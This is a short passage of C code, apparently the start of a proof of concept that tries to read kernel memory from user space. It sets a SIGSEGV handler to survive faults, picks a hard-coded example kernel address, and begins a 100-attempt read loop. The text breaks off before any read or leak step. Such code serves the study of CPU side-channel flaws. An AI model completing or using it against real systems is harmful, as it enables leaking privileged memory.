    signal(SIGSEGV, sigsegv_handler);

    // 选择一个内核地址（例如系统调用入口，需根据系统调整）
    uint64_t kernel_addr = 0xffffffff81000000; // 示例地址

    // 尝试多次读取
    for (int attempt = 0; attempt < 100; attempt++) {
